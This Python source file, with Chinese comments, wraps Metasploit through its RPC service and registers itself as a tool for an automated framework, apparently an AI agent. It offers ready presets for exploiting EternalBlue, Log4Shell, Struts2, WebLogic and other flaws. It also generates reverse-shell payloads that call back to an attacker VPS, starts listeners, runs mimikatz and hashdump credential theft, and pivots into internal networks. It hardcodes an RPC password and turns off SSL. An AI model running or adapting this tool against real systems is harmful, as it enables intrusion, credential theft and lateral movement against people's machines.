# tools/msf_tool.py
"""
Metasploit Framework 完整封装 (RPC持久性会话版)

功能模块:
1. 信息收集类 (Auxiliary) - 端口扫描、漏洞探测
2. 漏洞利用类 (Exploit) - MS17-010、Struts2、ThinkPHP等
3. 攻击载荷类 (Payload) - reverse_tcp、bind_tcp、meterpreter
4. 后渗透类 (Post) - 提权、凭据获取、信息收集
5. 会话管理 (Session) - RPC持久性交互、命令执行

核心特性:
- 使用 msfrpcd 启动RPC服务实现持久性会话
- 通过Msgpack协议与MSF RPC API交互
- 支持多会话并发管理
"""
import os
import re
import json
import time
import socket
import shutil
import subprocess
import requests
from typing import Dict, Any, Optional, List
from tool_framework import CommandLineTool

# 尝试导入msgpack（RPC通信需要）
try:
    import msgpack
    MSGPACK_AVAILABLE = True
except ImportError:
    MSGPACK_AVAILABLE = False


class MSFRPCClient:
    """
    Metasploit RPC 客户端

    通过msgpack协议与msfrpcd通信
    """

    def __init__(self, host: str = "127.0.0.1", port: int = 55553,
                 password: str = "msfpassword", ssl: bool = False):
        self.host = host
        self.port = port
        self.password = password
        self.ssl = ssl
        self.token = None
        self.url = f"{'https' if ssl else 'http'}://{host}:{port}/api/"

    def login(self) -> bool:
        """登录获取Token"""
        try:
            response = self._call("auth.login", ["msf", self.password])
            if response and b'token' in response:
                self.token = response[b'token'].decode() if isinstance(response[b'token'], bytes) else response[b'token']
                return True
        except Exception as e:
            print(f"[MSF RPC] Login failed: {e}")
        return False

    def _call(self, method: str, args: list) -> Optional[Dict]:
        """调用RPC方法"""
        if not MSGPACK_AVAILABLE:
            return None

        try:
            data = msgpack.packb([method] + args)
            headers = {"Content-Type": "binary/message-pack"}

            resp = requests.post(self.url, data=data, headers=headers,
                               timeout=30, verify=False)
            if resp.status_code == 200:
                return msgpack.unpackb(resp.content, raw=False)
        except Exception as e:
            print(f"[MSF RPC] Call error: {e}")
        return None

    def call(self, method: str, args: list = None) -> Optional[Dict]:
        """带Token调用RPC方法"""
        if not self.token:
            if not self.login():
                return None
        args = args or []
        return self._call(method, [self.token] + args)

    # ==================== 核心API ====================

    def get_version(self) -> Dict:
        """获取MSF版本"""
        return self.call("core.version")

    def list_sessions(self) -> Dict:
        """列出所有会话"""
        return self.call("session.list")

    def session_info(self, session_id: int) -> Dict:
        """获取会话详情"""
        return self.call("session.info", [str(session_id)])

    def session_execute(self, session_id: int, command: str) -> Dict:
        """在会话中执行命令"""
        return self.call("session.meterpreter_write", [str(session_id), command])

    def session_read(self, session_id: int) -> Dict:
        """读取会话输出"""
        return self.call("session.meterpreter_read", [str(session_id)])

    def session_shell(self, session_id: int, command: str) -> Dict:
        """Shell会话执行命令"""
        return self.call("session.shell_write", [str(session_id), command + "\n"])

    def session_shell_read(self, session_id: int) -> Dict:
        """读取Shell会话输出"""
        return self.call("session.shell_read", [str(session_id)])

    def session_kill(self, session_id: int) -> Dict:
        """终止会话"""
        return self.call("session.stop", [str(session_id)])

    def module_execute(self, module_type: str, module_name: str, options: Dict) -> Dict:
        """执行模块"""
        return self.call("module.execute", [module_type, module_name, options])

    def job_list(self) -> Dict:
        """列出所有任务"""
        return self.call("job.list")

    def job_info(self, job_id: int) -> Dict:
        """获取任务详情"""
        return self.call("job.info", [str(job_id)])

    def job_stop(self, job_id: int) -> Dict:
        """停止任务"""
        return self.call("job.stop", [str(job_id)])

    def console_create(self) -> Dict:
        """创建控制台"""
        return self.call("console.create")

    def console_destroy(self, console_id: str) -> Dict:
        """销毁控制台"""
        return self.call("console.destroy", [console_id])

    def console_write(self, console_id: str, command: str) -> Dict:
        """向控制台写入命令"""
        return self.call("console.write", [console_id, command])

    def console_read(self, console_id: str) -> Dict:
        """读取控制台输出"""
        return self.call("console.read", [console_id])


class MetasploitTool(CommandLineTool):
    """Metasploit Framework 完整封装 (RPC持久性会话版)"""

    # ==================== 信息收集模块 ====================
    AUXILIARY_MODULES = {
        "smb_ms17_010": {
            "module": "auxiliary/scanner/smb/smb_ms17_010",
            "description": "永恒之蓝漏洞探测",
            "params": ["RHOSTS"],
            "priority": 5
        },
        "smb_version": {
            "module": "auxiliary/scanner/smb/smb_version",
            "description": "SMB版本识别",
            "params": ["RHOSTS"],
            "priority": 4
        },
        "portscan_tcp": {
            "module": "auxiliary/scanner/portscan/tcp",
            "description": "TCP端口扫描",
            "params": ["RHOSTS", "PORTS"],
            "priority": 4
        },
        "ssh_version": {
            "module": "auxiliary/scanner/ssh/ssh_version",
            "description": "SSH版本识别",
            "params": ["RHOSTS"],
            "priority": 3
        },
        "ssh_login": {
            "module": "auxiliary/scanner/ssh/ssh_login",
            "description": "SSH弱口令爆破",
            "params": ["RHOSTS", "USERNAME", "PASSWORD"],
            "priority": 3
        },
        "smb_login": {
            "module": "auxiliary/scanner/smb/smb_login",
            "description": "SMB弱口令爆破",
            "params": ["RHOSTS", "USERNAME", "PASSWORD", "DOMAIN"],
            "priority": 3
        },
        "mssql_login": {
            "module": "auxiliary/scanner/mssql/mssql_login",
            "description": "MSSQL弱口令爆破",
            "params": ["RHOSTS", "USERNAME", "PASSWORD"],
            "priority": 3
        },
        "ldap_enum": {
            "module": "auxiliary/gather/ldap_enum",
            "description": "LDAP域信息枚举",
            "params": ["RHOSTS", "DOMAIN"],
            "priority": 4
        },
    }

    # ==================== 漏洞利用模块 ====================
    EXPLOIT_MODULES = {
        "ms17_010_eternalblue": {
            "module": "exploit/windows/smb/ms17_010_eternalblue",
            "description": "永恒之蓝 (Win7/2008 R2 64位)",
            "params": ["RHOSTS", "LHOST", "LPORT"],
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "priority": 5
        },
        "ms17_010_psexec": {
            "module": "exploit/windows/smb/ms17_010_psexec",
            "description": "永恒之蓝PsExec (WinXP/2003 32位)",
            "params": ["RHOSTS", "LHOST", "LPORT"],
            "payload": "windows/meterpreter/reverse_tcp",
            "priority": 4
        },
        "ms08_067_netapi": {
            "module": "exploit/windows/smb/ms08_067_netapi",
            "description": "MS08-067经典漏洞",
            "params": ["RHOSTS", "LHOST", "LPORT"],
            "payload": "windows/meterpreter/reverse_tcp",
            "priority": 4
        },
        "struts2_rest_xstream": {
            "module": "exploit/multi/http/struts2_rest_xstream",
            "description": "Struts2 XStream RCE",
            "params": ["RHOSTS", "TARGETURI"],
            "payload": "linux/x64/meterpreter/reverse_tcp",
            "priority": 3
        },
        "thinkphp_rce": {
            "module": "exploit/linux/http/thinkphp_rce",
            "description": "ThinkPHP远程代码执行",
            "params": ["RHOSTS", "TARGETURI"],
            "payload": "linux/x64/meterpreter/reverse_tcp",
            "priority": 3
        },
        "log4shell_jndi": {
            "module": "exploit/multi/http/log4shell_jndi_injection",
            "description": "Log4Shell JNDI注入",
            "params": ["RHOSTS", "LHOST"],
            "payload": "java/jsp_shell_reverse_tcp",
            "priority": 5
        },
        "tomcat_mgr_upload": {
            "module": "exploit/multi/http/tomcat_mgr_upload",
            "description": "Tomcat Manager WAR部署",
            "params": ["RHOSTS", "HttpUsername", "HttpPassword"],
            "payload": "java/jsp_shell_reverse_tcp",
            "priority": 3
        },
        "weblogic_t3": {
            "module": "exploit/oracle/weblogic_t3_deserialize",
            "description": "WebLogic T3反序列化",
            "params": ["RHOSTS", "LHOST"],
            "payload": "java/jsp_shell_reverse_tcp",
            "priority": 4
        },
    }

    # ==================== 攻击载荷 ====================
    PAYLOADS = {
        "windows_x64_reverse_tcp": {
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "description": "Windows 64位反弹Meterpreter",
            "params": ["LHOST", "LPORT"],
            "priority": 5
        },
        "windows_x86_reverse_tcp": {
            "payload": "windows/meterpreter/reverse_tcp",
            "description": "Windows 32位反弹Meterpreter",
            "params": ["LHOST", "LPORT"],
            "priority": 5
        },
        "linux_x64_reverse_tcp": {
            "payload": "linux/x64/meterpreter/reverse_tcp",
            "description": "Linux 64位反弹Meterpreter",
            "params": ["LHOST", "LPORT"],
            "priority": 5
        },
        "php_reverse_tcp": {
            "payload": "php/meterpreter/reverse_tcp",
            "description": "PHP Meterpreter",
            "params": ["LHOST", "LPORT"],
            "priority": 4
        },
        "jsp_reverse_tcp": {
            "payload": "java/jsp_shell_reverse_tcp",
            "description": "JSP反弹Shell",
            "params": ["LHOST", "LPORT"],
            "priority": 4
        },
    }

    # ==================== 后渗透模块 ====================
    POST_MODULES = {
        "checkvm": {
            "module": "post/windows/gather/checkvm",
            "description": "检测是否为虚拟机",
            "priority": 4
        },
        "enum_patches": {
            "module": "post/windows/gather/enum_patches",
            "description": "获取补丁信息(提权关键)",
            "priority": 5
        },
        "local_exploit_suggester": {
            "module": "post/multi/recon/local_exploit_suggester",
            "description": "自动检测提权漏洞",
            "priority": 5
        },
        "hashdump": {
            "module": "post/windows/gather/hashdump",
            "description": "获取SAM哈希(SYSTEM权限)",
            "priority": 5
        },
        "mimikatz": {
            "module": "post/windows/gather/credentials/mimikatz",
            "description": "Mimikatz获取明文密码",
            "priority": 5
        },
        "enable_rdp": {
            "module": "post/windows/manage/enable_rdp",
            "description": "启用远程桌面",
            "priority": 3
        },
        "arp_scanner": {
            "module": "post/multi/gather/arp_scanner",
            "description": "ARP扫描内网",
            "priority": 4
        },
        "autoroute": {
            "module": "post/multi/manage/autoroute",
            "description": "添加路由(内网跳板)",
            "priority": 4
        },
    }

    # RPC配置
    RPC_HOST = "127.0.0.1"
    RPC_PORT = 55553
    RPC_PASSWORD = "msfpassword"

    def __init__(self):
        self.executable = self._find_msfconsole()
        self.msfvenom = self._find_msfvenom()
        self.msrpfd_path = self._find_msrpcd()
        super().__init__(self.executable or "msfconsole")

        self.timeout = 300
        self.rpc_client = None
        self.rpc_process = None
        self._rpc_started = False

        # 会话持久化文件
        self.sessions_file = "/app/data/msf_sessions.json"

    def _find_msfconsole(self) -> Optional[str]:
        """查找msfconsole"""
        msf = shutil.which("msfconsole")
        if msf:
            return msf
        paths = ["/usr/bin/msfconsole", "/usr/local/bin/msfconsole",
                 "/opt/metasploit-framework/bin/msfconsole"]
        for path in paths:
            if os.path.exists(path):
                return path
        return None

    def _find_msfvenom(self) -> Optional[str]:
        """查找msfvenom"""
        msfvenom = shutil.which("msfvenom")
        if msfvenom:
            return msfvenom
        paths = ["/usr/bin/msfvenom", "/usr/local/bin/msfvenom",
                 "/opt/metasploit-framework/bin/msfvenom"]
        for path in paths:
            if os.path.exists(path):
                return path
        return None

    def _find_msrpcd(self) -> Optional[str]:
        """查找msfrpcd"""
        msfrpcd = shutil.which("msfrpcd")
        if msfrpcd:
            return msfrpcd
        paths = ["/usr/bin/msfrpcd", "/usr/local/bin/msfrpcd",
                 "/opt/metasploit-framework/bin/msfrpcd"]
        for path in paths:
            if os.path.exists(path):
                return path
        return None

    def name(self) -> str:
        return "msf"

    def description(self) -> str:
        return "Metasploit Framework完整封装(RPC持久性会话)，支持漏洞探测、利用、载荷生成、后渗透操作、持久性会话管理"

    def supported_vulns(self) -> list:
        return [
            "MS17-010", "MS08-067", "Struts2", "ThinkPHP", "Log4Shell",
            "Tomcat", "WebLogic", "Privilege Escalation",
            "Credential Dumping", "Reverse Shell", "Meterpreter",
            "Internal Network", "Lateral Movement", "Session Management"
        ]

    def capability_statement(self) -> str:
        return ("Metasploit框架(RPC持久性会话版)。支持永恒之蓝/Log4Shell等漏洞利用，"
                "后渗透提权/凭据获取/内网扫描。通过RPC API管理持久性会话，支持跨调用会话保持。")

    def check_available(self) -> bool:
        if not self.executable:
            return False
        try:
            result = subprocess.run(
                [self.executable, "--version"],
                capture_output=True, timeout=10
            )
            return result.returncode == 0
        except Exception:
            return False

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "action": {
                "type": "str",
                "description": "操作: scan/exploit/payload/post/handler/session/exec/list/rpc_status",
                "required": True
            },
            "module": {
                "type": "str",
                "description": "模块名称或预设(如 ms17_010_eternalblue)",
                "required": False
            },
            "rhosts": {
                "type": "str",
                "description": "目标IP/网段",
                "required": False
            },
            "lhost": {
                "type": "str",
                "description": "回调地址(VPS公网IP)",
                "required": False
            },
            "lport": {
                "type": "int",
                "description": "回调端口",
                "required": False,
                "default": 4444
            },
            "session": {
                "type": "int",
                "description": "Meterpreter会话ID",
                "required": False
            },
            "command": {
                "type": "str",
                "description": "Meterpreter命令(用于exec操作)",
                "required": False
            }
        }

    # ==================== RPC服务管理 ====================

    def start_rpc(self) -> Dict:
        """启动MSF RPC服务"""
        if not self.msrpfd_path:
            return {
                "success": False,
                "error": "msfrpcd未找到",
                "install": "apt install metasploit-framework"
            }

        # 检查是否已经运行
        if self._check_rpc_running():
            return {
                "success": True,
                "message": "RPC服务已在运行",
                "host": self.RPC_HOST,
                "port": self.RPC_PORT
            }

        try:
            # 启动msfrpcd
            cmd = [
                self.msrpfd_path,
                "-P", self.RPC_PASSWORD,
                "-S",  # 禁用SSL（简化连接）
                "-f",  # 前台运行（便于管理）
                "-p", str(self.RPC_PORT)
            ]

            self.rpc_process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                start_new_session=True
            )

            # 等待启动
            time.sleep(3)

            if self._check_rpc_running():
                self._rpc_started = True
                return {
                    "success": True,
                    "message": "RPC服务启动成功",
                    "host": self.RPC_HOST,
                    "port": self.RPC_PORT,
                    "password": self.RPC_PASSWORD,
                    "pid": self.rpc_process.pid
                }
            else:
                return {"success": False, "error": "RPC服务启动失败"}

        except Exception as e:
            return {"success": False, "error": str(e)}

    def _check_rpc_running(self) -> bool:
        """检查RPC服务是否运行"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((self.RPC_HOST, self.RPC_PORT))
            sock.close()
            return result == 0
        except Exception:
            return False

    def get_rpc_client(self) -> Optional[MSFRPCClient]:
        """获取RPC客户端"""
        if not MSGPACK_AVAILABLE:
            return None

        if not self._check_rpc_running():
            result = self.start_rpc()
            if not result.get("success"):
                return None

        if not self.rpc_client:
            self.rpc_client = MSFRPCClient(
                host=self.RPC_HOST,
                port=self.RPC_PORT,
                password=self.RPC_PASSWORD
            )
            if not self.rpc_client.login():
                self.rpc_client = None
                return None

        return self.rpc_client

    def stop_rpc(self) -> Dict:
        """停止RPC服务"""
        if self.rpc_process:
            try:
                self.rpc_process.terminate()
                self.rpc_process.wait(timeout=5)
            except Exception:
                self.rpc_process.kill()
            self.rpc_process = None
            self.rpc_client = None
            self._rpc_started = False
            return {"success": True, "message": "RPC服务已停止"}
        return {"success": True, "message": "RPC服务未运行"}

    # ==================== 执行入口 ====================

    def execute(self, target: str, params: Dict) -> Dict:
        if not self.check_available():
            return {
                "success": False,
                "error": "Metasploit未安装",
                "install": "apt install metasploit-framework"
            }

        action = params.get("action", "list")

        if action == "list":
            return self._list_modules()
        elif action == "rpc_status":
            return self._rpc_status()
        elif action == "scan":
            return self._run_auxiliary(params)
        elif action == "exploit":
            return self._run_exploit(params)
        elif action == "payload":
            return self._generate_payload(params)
        elif action == "post":
            return self._run_post(params)
        elif action == "handler":
            return self._start_handler(params)
        elif action == "session":
            return self._session_action(params)
        elif action == "exec":
            return self._session_exec(params)
        else:
            return {"success": False, "error": f"未知操作: {action}"}

    # ==================== 模块列表 ====================

    def _list_modules(self) -> Dict:
        """列出所有可用模块"""
        return {
            "success": True,
            "auxiliary": {k: {"module": v["module"], "description": v["description"]}
                          for k, v in self.AUXILIARY_MODULES.items()},
            "exploits": {k: {"module": v["module"], "description": v["description"], "payload": v.get("payload")}
                         for k, v in self.EXPLOIT_MODULES.items()},
            "payloads": {k: {"payload": v["payload"], "description": v["description"]}
                         for k, v in self.PAYLOADS.items()},
            "post": {k: {"module": v["module"], "description": v["description"]}
                     for k, v in self.POST_MODULES.items()},
            "rpc_info": {
                "host": self.RPC_HOST,
                "port": self.RPC_PORT,
                "msgpack_available": MSGPACK_AVAILABLE
            }
        }

    def _rpc_status(self) -> Dict:
        """获取RPC服务状态"""
        running = self._check_rpc_running()
        result = {
            "success": True,
            "rpc_running": running,
            "msgpack_available": MSGPACK_AVAILABLE,
            "host": self.RPC_HOST,
            "port": self.RPC_PORT
        }

        if running:
            client = self.get_rpc_client()
            if client:
                version = client.get_version()
                sessions = client.list_sessions()
                jobs = client.job_list()
                result["version"] = version
                result["sessions"] = sessions
                result["jobs"] = jobs

        return result

    # ==================== 信息收集 (RPC) ====================

    def _run_auxiliary(self, params: Dict) -> Dict:
        """运行信息收集模块"""
        module_name = params.get("module")
        rhosts = params.get("rhosts")

        if not module_name:
            return {"success": False, "error": "必须指定module参数"}

        if module_name not in self.AUXILIARY_MODULES:
            return {"success": False, "error": f"未知模块: {module_name}",
                    "available": list(self.AUXILIARY_MODULES.keys())}

        module_info = self.AUXILIARY_MODULES[module_name]
        module_path = module_info["module"]

        # 构建选项
        options = {"RHOSTS": rhosts}
        if params.get("ports"):
            options["PORTS"] = params["ports"]
        if params.get("username"):
            options["USERNAME"] = params["username"]
        if params.get("password"):
            options["PASSWORD"] = params["password"]
        if params.get("domain"):
            options["DOMAIN"] = params["domain"]

        # 尝试使用RPC
        client = self.get_rpc_client()
        if client:
            result = client.module_execute("auxiliary", module_path.split("/")[-1], options)
            return {
                "success": True,
                "module": module_name,
                "method": "rpc",
                "result": result,
                "options": options
            }

        # 备选：使用RC脚本
        return self._execute_auxiliary_rc(module_path, options, module_name)

    def _execute_auxiliary_rc(self, module_path: str, options: Dict, module_name: str) -> Dict:
        """使用RC脚本执行辅助模块（备选方案）"""
        rc_content = f"use {module_path}\n"
        for key, value in options.items():
            rc_content += f"set {key} {value}\n"
        rc_content += "run\nexit -y\n"

        return self._execute_rc(rc_content, f"auxiliary/{module_name}")

    # ==================== 漏洞利用 (RPC) ====================

    def _run_exploit(self, params: Dict) -> Dict:
        """运行漏洞利用模块"""
        module_name = params.get("module")
        rhosts = params.get("rhosts")
        lhost = params.get("lhost")
        lport = params.get("lport", 4444)

        if not module_name:
            return {"success": False, "error": "必须指定module参数"}

        if module_name not in self.EXPLOIT_MODULES:
            return {"success": False, "error": f"未知模块: {module_name}",
                    "available": list(self.EXPLOIT_MODULES.keys())}

        module_info = self.EXPLOIT_MODULES[module_name]
        module_path = module_info["module"]
        payload = module_info.get("payload", "")

        # 构建选项
        options = {"RHOSTS": rhosts}
        if lhost and payload:
            options["LHOST"] = lhost
            options["LPORT"] = lport
            options["PAYLOAD"] = payload

        if params.get("targeturi"):
            options["TARGETURI"] = params["targeturi"]
        if params.get("httpusername"):
            options["HttpUsername"] = params["httpusername"]
        if params.get("httppassword"):
            options["HttpPassword"] = params["httppassword"]

        # 尝试使用RPC
        client = self.get_rpc_client()
        if client:
            # 使用完整模块路径
            exploit_name = "/".join(module_path.split("/")[-2:])
            result = client.module_execute("exploit", exploit_name, options)
            return {
                "success": True,
                "module": module_name,
                "method": "rpc",
                "result": result,
                "options": options,
                "session_hint": "会话将通过RPC持久化管理"
            }

        # 备选：使用RC脚本
        return self._execute_exploit_rc(module_path, options, module_name)

    def _execute_exploit_rc(self, module_path: str, options: Dict, module_name: str) -> Dict:
        """使用RC脚本执行漏洞利用（备选方案）"""
        rc_content = f"use {module_path}\n"
        for key, value in options.items():
            rc_content += f"set {key} {value}\n"
        rc_content += "run -z\nexit -y\n"

        result = self._execute_rc(rc_content, f"exploit/{module_name}")
        result["session_hint"] = {
            "list_sessions": "msfconsole -x 'sessions -l'",
            "interact": "msfconsole -x 'sessions -i <session_id>'"
        }
        return result

    # ==================== 载荷生成 ====================

    def _generate_payload(self, params: Dict) -> Dict:
        """生成攻击载荷"""
        payload_name = params.get("module", "windows_x64_reverse_tcp")
        lhost = params.get("lhost")
        lport = params.get("lport", 4444)
        output_format = params.get("format", "exe")
        out_file = params.get("out_file")

        if not lhost:
            return {"success": False, "error": "必须指定lhost(VPS公网IP)"}

        if payload_name not in self.PAYLOADS:
            return {"success": False, "error": f"未知载荷: {payload_name}",
                    "available": list(self.PAYLOADS.keys())}

        payload_info = self.PAYLOADS[payload_name]
        payload = payload_info["payload"]

        msfvenom = self.msfvenom or "msfvenom"
        cmd = [msfvenom, "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", output_format]

        if out_file:
            os.makedirs("/app/data", exist_ok=True)
            out_path = f"/app/data/{out_file}"
            cmd.extend(["-o", out_path])
        else:
            out_path = None

        try:
            result = subprocess.run(cmd, capture_output=True, timeout=60)
            if result.returncode != 0:
                return {"success": False, "error": result.stderr.decode()}

            output = result.stdout
            return {
                "success": True,
                "payload": payload,
                "format": output_format,
                "lhost": lhost,
                "lport": lport,
                "size": len(output),
                "saved_to": out_path,
                "handler_command": f"msfconsole -x 'use exploit/multi/handler; set payload {payload}; set LHOST {lhost}; set LPORT {lport}; run'"
            }
        except Exception as e:
            return {"success": False, "error": str(e)}

    # ==================== 后渗透 (RPC) ====================

    def _run_post(self, params: Dict) -> Dict:
        """运行后渗透模块"""
        module_name = params.get("module")
        session_id = params.get("session")

        if not module_name:
            return {"success": False, "error": "必须指定module参数"}

        if module_name not in self.POST_MODULES:
            return {"success": False, "error": f"未知模块: {module_name}",
                    "available": list(self.POST_MODULES.keys())}

        module_info = self.POST_MODULES[module_name]
        module_path = module_info["module"]

        # 尝试使用RPC
        client = self.get_rpc_client()
        if client and session_id:
            options = {"SESSION": str(session_id)}
            post_name = "/".join(module_path.split("/")[-2:])
            result = client.module_execute("post", post_name, options)
            return {
                "success": True,
                "module": module_name,
                "method": "rpc",
                "session_id": session_id,
                "result": result
            }

        # 备选：使用RC脚本
        rc_content = f"use {module_path}\n"
        if session_id:
            rc_content += f"set SESSION {session_id}\n"
        rc_content += "run\nexit -y\n"

        return self._execute_rc(rc_content, f"post/{module_name}")

    # ==================== 监听器 ====================

    def _start_handler(self, params: Dict) -> Dict:
        """启动监听器"""
        lhost = params.get("lhost", "0.0.0.0")
        lport = params.get("lport", 4444)
        payload = params.get("payload", "windows/x64/meterpreter/reverse_tcp")

        # 尝试使用RPC启动handler
        client = self.get_rpc_client()
        if client:
            options = {
                "PAYLOAD": payload,
                "LHOST": lhost,
                "LPORT": str(lport),
                "ExitOnSession": "false"
            }
            result = client.module_execute("exploit", "multi/handler", options)
            return {
                "success": True,
                "method": "rpc",
                "handler": result,
                "payload": payload,
                "lhost": lhost,
                "lport": lport,
                "message": "Handler通过RPC启动，会话将持久化管理"
            }

        # 备选：返回命令
        rc_content = f"""use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
run -j
"""
        return {
            "success": True,
            "method": "manual",
            "rc_script": rc_content,
            "start_command": f"msfconsole -q -x '{rc_content.strip()}'",
            "background_command": f"nohup msfconsole -q -x '{rc_content.strip()}' &"
        }

    # ==================== 会话管理 (RPC持久性) ====================

    def _session_action(self, params: Dict) -> Dict:
        """会话管理操作"""
        sub_action = params.get("sub_action", "list")
        session_id = params.get("session")

        # 使用RPC进行会话管理
        client = self.get_rpc_client()
        if not client:
            return {
                "success": False,
                "error": "RPC服务不可用，无法进行持久性会话管理",
                "hint": "使用 action=rpc_status 检查RPC状态"
            }

        if sub_action == "list":
            sessions = client.list_sessions()
            return {
                "success": True,
                "method": "rpc",
                "sessions": sessions,
                "count": len(sessions) if sessions else 0
            }

        elif sub_action == "info" and session_id:
            info = client.session_info(session_id)
            return {
                "success": True,
                "method": "rpc",
                "session_id": session_id,
                "info": info
            }

        elif sub_action == "kill" and session_id:
            result = client.session_kill(session_id)
            return {
                "success": True,
                "method": "rpc",
                "session_id": session_id,
                "result": result
            }

        elif sub_action == "upgrade" and session_id:
            lhost = params.get("lhost", "0.0.0.0")
            lport = params.get("lport", 4445)
            # 升级会话到Meterpreter
            result = client.call("session.meterpreter_session_detach", [str(session_id)])
            return {
                "success": True,
                "method": "rpc",
                "session_id": session_id,
                "result": result
            }

        return {"success": False, "error": "需要指定sub_action: list/info/kill/upgrade"}

    def _session_exec(self, params: Dict) -> Dict:
        """在会话中执行命令"""
        session_id = params.get("session")
        command = params.get("command")

        if not session_id:
            return {"success": False, "error": "必须指定session参数"}
        if not command:
            return {"success": False, "error": "必须指定command参数"}

        # 使用RPC执行
        client = self.get_rpc_client()
        if not client:
            return {
                "success": False,
                "error": "RPC服务不可用，无法进行持久性会话操作"
            }

        # 获取会话类型
        sessions = client.list_sessions()
        session_info = sessions.get(str(session_id), {}) if sessions else {}
        session_type = session_info.get("type", "meterpreter")

        if session_type == "meterpreter":
            # Meterpreter命令
            client.session_execute(session_id, command)
            time.sleep(1)
            output = client.session_read(session_id)
        else:
            # Shell命令
            client.session_shell(session_id, command)
            time.sleep(1)
            output = client.session_shell_read(session_id)

        return {
            "success": True,
            "method": "rpc",
            "session_id": session_id,
            "command": command,
            "output": output
        }

    # ==================== RC脚本执行（备选） ====================

    def _execute_rc(self, rc_content: str, module_name: str) -> Dict:
        """执行RC脚本（非RPC备选方案）"""
        os.makedirs("/app/data", exist_ok=True)
        rc_path = f"/app/data/msf_{int(time.time())}.rc"

        try:
            with open(rc_path, 'w') as f:
                f.write(rc_content)

            cmd = [self.executable, "-q", "-r", rc_path]
            result = self._run_command(cmd, timeout=self.timeout, stream_output=True)

            return {
                "success": result.get("returncode", 0) == 0,
                "method": "rc_script",
                "module": module_name,
                "output": result.get("stdout", ""),
                "error": result.get("stderr", ""),
                "rc_file": rc_path,
                "warning": "使用RC脚本执行，会话不会持久化。建议使用RPC模式。"
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
        finally:
            try:
                if os.path.exists(rc_path):
                    os.unlink(rc_path)
            except:
                pass

    # ==================== 快捷方法 ====================

    def scan_ms17_010(self, target: str) -> Dict:
        """快速扫描永恒之蓝漏洞"""
        return self._run_auxiliary({"module": "smb_ms17_010", "rhosts": target})

    def exploit_ms17_010(self, target: str, lhost: str, lport: int = 4444) -> Dict:
        """利用永恒之蓝"""
        return self._run_exploit({
            "module": "ms17_010_eternalblue",
            "rhosts": target,
            "lhost": lhost,
            "lport": lport
        })

    def generate_windows_shell(self, lhost: str, lport: int = 4444) -> Dict:
        """生成Windows反弹Shell"""
        return self._generate_payload({
            "module": "windows_x64_reverse_tcp",
            "lhost": lhost,
            "lport": lport,
            "format": "exe"
        })

    def list_sessions(self) -> Dict:
        """列出所有会话"""
        return self._session_action({"sub_action": "list"})

    def exec_in_session(self, session_id: int, command: str) -> Dict:
        """在会话中执行命令"""
        return self._session_exec({"session": session_id, "command": command})


def register():
    from tool_framework import ToolRegistry
    ToolRegistry.register(MetasploitTool())